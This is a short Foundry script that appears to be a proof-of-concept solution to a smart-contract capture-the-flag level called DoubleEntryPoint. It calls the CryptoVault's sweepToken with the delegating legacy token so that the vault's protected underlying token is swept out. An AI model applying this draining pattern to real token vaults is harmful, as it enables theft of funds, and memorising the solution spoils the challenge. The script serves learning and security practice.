// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDoubleEntryPoint {
    function cryptoVault() external view returns (address);

    function delegatedFrom() external view returns (address);
}

interface ICryptoVault {
    function underlying() external view returns (address);

    function sweepToken(IERC20 token) external;
}

contract PoC is Script {
    IDoubleEntryPoint level26 =
        IDoubleEntryPoint(0x1Ac3aD234aFEE64572c28242BF0197E1e8CaA717); // Replace with your DoubleEntryPoint instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        ICryptoVault vault = ICryptoVault(level26.cryptoVault());
        address DET = address(vault.underlying());
        address LGT = level26.delegatedFrom();
        vault.sweepToken(IERC20(LGT)); //calling sweepToken with LGT address on the CryptoVault

        vm.stopBroadcast();
    }
}
